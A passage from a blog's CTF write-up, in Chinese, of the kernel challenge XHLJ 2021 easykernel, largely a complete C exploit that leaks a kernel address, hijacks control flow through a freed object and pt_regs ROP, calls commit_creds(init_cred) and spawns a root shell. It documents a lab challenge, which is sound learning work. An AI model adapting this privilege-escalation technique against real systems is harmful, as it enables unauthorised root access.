+<p>剛好 kernel stack 這塊緊接著之前堆 ROP 的位置<br>另外這個 function 前面剛好有一堆 pop<br>所以要剛好 pop 到第一個 dummy 前，計算一下要多 pop 9 次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop     r15             ; Alternative name is &#x27;__irqentry_text_end&#x27;</span><br><span class="line">pop     r14</span><br><span class="line">pop     r13</span><br><span class="line">pop     r12</span><br><span class="line">pop     rbp </span><br><span class="line">pop     rbx &lt; 跳到這 (+0x9)</span><br><span class="line">pop     r11</span><br><span class="line">pop     r10</span><br><span class="line">pop     r9</span><br><span class="line">pop     r8</span><br><span class="line">pop     rax</span><br><span class="line">pop     rcx</span><br><span class="line">pop     rdx</span><br><span class="line">pop     rsi</span><br></pre></td></tr></table></figure>
+
+<p>詳細 stack 狀況可以看這個</p>
+<img src="/2025/05/14/XHLJ-2021-easykernel-writeup/c.png" class="">
+
+<p>總之跳上去後返回 usermode 就可以 get root shell 了</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc exploit.c -o exp --static -masm=intel -g</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_IOCTL 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KFREE_IOCTL 0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHOW_IOCTL 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_IOCTL 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd_dev;</span><br><span class="line"><span class="type">int</span> fd_seq;</span><br><span class="line"><span class="type">uint64_t</span> kernelbase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">	<span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kfree_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> index;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> index;</span><br><span class="line">	<span class="type">uint64_t</span> size;</span><br><span class="line">	<span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_kmalloc</span><span class="params">(<span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, KMALLOC_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_kfree</span><span class="params">(<span class="type">uint64_t</span> index)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kfree_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    ioctl(fd_dev, KFREE_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_show</span><span class="params">(<span class="type">uint64_t</span> index, <span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, SHOW_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_edit</span><span class="params">(<span class="type">uint64_t</span> index, <span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, EDIT_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Get Root\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed EoP\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> buf1[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">uint64_t</span> buf2[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">uint64_t</span> pop_rdi;</span><br><span class="line"><span class="type">uint64_t</span> init_cred;</span><br><span class="line"><span class="type">uint64_t</span> commit_cred;</span><br><span class="line"><span class="type">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="type">uint64_t</span> add_rsp_gadget;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    bind_cpu(<span class="number">0</span>);</span><br><span class="line">    fd_dev = open(<span class="string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd_dev &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to open device !\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Success open /dev/kerpwn\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Start leak kernel address \n&quot;</span>);</span><br><span class="line">    io_kmalloc(<span class="number">0x20</span>, buf1); <span class="comment">// index 0</span></span><br><span class="line">    io_kfree(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd_seq = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    io_show(<span class="number">0</span>, <span class="number">0x20</span>, buf1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel address : 0x%lx\n&quot;</span>, buf1[<span class="number">0</span>]);</span><br><span class="line">    kernelbase = buf1[<span class="number">0</span>] - <span class="number">0x319d30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel base : 0x%lx\n&quot;</span>, kernelbase);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xffffffff81b1a9ad: pop rdi; ret;</span></span><br><span class="line">    <span class="comment">// 0xffffffff810b2802: add rsp, 0x190; pop rbx; pop r12; pop rbp; ret;</span></span><br><span class="line">    pop_rdi = kernelbase + <span class="number">0xb1a9ad</span>;</span><br><span class="line">    init_cred = kernelbase + <span class="number">0x1663300</span>;</span><br><span class="line">    commit_cred = kernelbase + <span class="number">0xc8d40</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = kernelbase + <span class="number">0xc00f30</span> + <span class="number">0x9</span>;</span><br><span class="line">    add_rsp_gadget = kernelbase + <span class="number">0xb2802</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Try to EoP\n&quot;</span>);</span><br><span class="line">    buf2[<span class="number">0</span>] = add_rsp_gadget;</span><br><span class="line">    io_edit(<span class="number">0</span>, <span class="number">0x20</span>, buf2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r14,   pop_rdi;&quot;</span> <span class="comment">//</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r13,   init_cred;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r12,   commit_cred;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rbp,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rax,   rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rdx,   8;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rdi,   fd_seq;&quot;</span>  </span></span><br><span class="line"><span class="params">        <span class="string">&quot;syscall&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/iGZYySNjzqk?si=edxHkwVqHGDh7BT0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/San-Diego-CTF-2025/SDCTF.png" data-sizes="auto" alt="San Diego CTF 2025 - all pwn challenge" class="lazyload">
+      
+      <a href="/2025/05/12/San-Diego-CTF-2025-writeup/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          San Diego CTF 2025 - all pwn challenge
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        174.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        15:16
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XHLJ-2021-easykernel-writeup"><span class="toc-number">1.</span> <span class="toc-text">XHLJ 2021-easykernel - writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#analyze"><span class="toc-number">1.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall-and-pt-regs"><span class="toc-number">1.2.</span> <span class="toc-text">syscall and pt_regs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cool-commit-protect-pt-regs"><span class="toc-number">1.3.</span> <span class="toc-text">cool commit protect pt_regs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-test-ko"><span class="toc-number">1.4.</span> <span class="toc-text">reverse test.ko</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#show-ioctlcode-0x40"><span class="toc-number">1.4.1.</span> <span class="toc-text">show (ioctlcode &#x3D;&#x3D; 0x40)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit-ioctlcode-0x50"><span class="toc-number">1.4.2.</span> <span class="toc-text">edit (ioctlcode &#x3D;&#x3D; 0x50)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#alloc-ioctlcode-0x20"><span class="toc-number">1.4.3.</span> <span class="toc-text">alloc (ioctlcode &#x3D;&#x3D; 0x20)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-ioctlcode-0x30"><span class="toc-number">1.4.4.</span> <span class="toc-text">free (ioctlcode &#x3D;&#x3D; 0x30)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%85%B3%E6%9C%AC%E6%9E%B6%E6%A7%8B"><span class="toc-number">1.5.</span> <span class="toc-text">腳本架構</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.7.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.8.</span> <span class="toc-text">demo</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">68</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "XHLJ 2021-easykernel - writeup",
+          url: "http://example.com/2025/05/14/XHLJ-2021-easykernel-writeup/",
+          excerpt: "",
+          description: "",
+          stripContent: "XHLJ 2021-easykernel - writeup Author : 堇姬 Naup  analyze一樣的題目給了三個文件 12345naup96321@naup96321-virtual-machine:~/Desktop/ekernel$ tree.├── bzImage├── rootfs.img.gz└── start.sh  先解包 file system 123mkdir -p sysfilegunzip rootfs.img.gzcpio -idmv -D sysfil",
+          date: "Wed May 14 2025 21:27:37 GMT+0800",
+          updated: "Wed May 14 2025 21:32:36 GMT+0800",
+          cover: "/images/posts_cover/LinuxKernelPwn/linuxkernel.png",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
